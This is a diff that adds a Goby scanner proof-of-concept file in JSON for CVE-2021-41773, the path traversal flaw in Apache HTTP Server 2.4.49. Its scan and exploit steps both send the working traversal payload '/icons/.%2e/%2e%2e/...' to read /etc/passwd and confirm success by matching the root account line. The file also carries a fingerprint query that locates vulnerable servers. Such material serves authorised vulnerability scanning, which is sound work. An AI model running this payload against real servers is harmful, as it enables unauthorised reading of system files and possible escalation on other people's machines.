@@ -1,0 +1,105 @@
+{
+      "Name": "Apache HTTP Server Arbitrary File Read(CVE-2021-41773)",
+      "Level": "2",
+      "Tags": [
+            "fileread"
+      ],
+      "GobyQuery": "(server=\"Apache/2.4.49\"||product=\"Apache-Web-Server\"||server=\"Apache\")",
+      "Description": "A flaw was found in a change made to path normalization in Apache HTTP Server 2.4.49. An attacker could use a path traversal attack to map URLs to files outside the directories configured by Alias-like directives. If files outside of these directories are not protected by the usual default configuration \"require all denied\", these requests can succeed. If CGI scripts are also enabled for these aliased pathes, this could allow for remote code execution. This issue is known to be exploited in the wild. This issue only affects Apache 2.4.49 and not earlier versions.",
+      "Product": "Apache HTTP Server",
+      "Homepage": "http://httpd.apache.org/",
+      "Author": "aetkrad",
+      "Impact": "<p>read arbitrary files<br></p>",
+      "Recommendation": "",
+      "References": [
+            "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41773"
+      ],
+      "HasExp": true,
+      "ExpParams": [
+            {
+                  "Name": "Filepath",
+                  "Type": "input",
+                  "Value": "/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
+            }
+      ],
+      "ExpTips": {
+            "Type": "",
+            "Content": ""
+      },
+      "ScanSteps": [
+            "AND",
+            {
+                  "Request": {
+                        "method": "GET",
+                        "uri": "/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
+                        "follow_redirect": false,
+                        "header": null,
+                        "data_type": "text",
+                        "data": "",
+                        "set_variable": []
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "root:x:0:0:root:",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": [
+                        "output|lastbody||"
+                  ]
+            }
+      ],
+      "ExploitSteps": [
+            "AND",
+            {
+                  "Request": {
+                        "method": "GET",
+                        "uri": "/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
+                        "follow_redirect": false,
+                        "header": null,
+                        "data_type": "text",
+                        "data": "",
+                        "set_variable": []
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "root:x:0:0:root:",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": [
+                        "output|lastbody||"
+                  ]
+            }
+      ],
+      "PostTime": "2021-10-28 10:10:27",
+      "GobyVersion": "1.8.302"
+}
